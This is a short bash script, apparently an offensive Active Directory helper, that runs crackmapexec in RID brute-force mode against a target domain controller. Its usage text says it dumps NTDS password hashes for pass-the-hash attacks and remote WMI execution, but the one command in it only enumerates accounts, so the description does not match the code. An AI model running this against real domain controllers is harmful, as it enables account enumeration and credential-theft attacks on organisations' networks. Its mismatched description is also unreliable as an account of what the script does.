#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <target dc>"
	echo "$0 connects to a DC with the specified admin credentials and dumps the user account hashes from NTDS.  These can be used with crackmapexec to pass-the-hash (-H) to run WMI calls and perform other tasks."
}

if [ $# -lt 1 ]; then
	ShowUsage
	exit 1
fi

TARGETS="$1"

crackmapexec --rid-brute $TARGETS

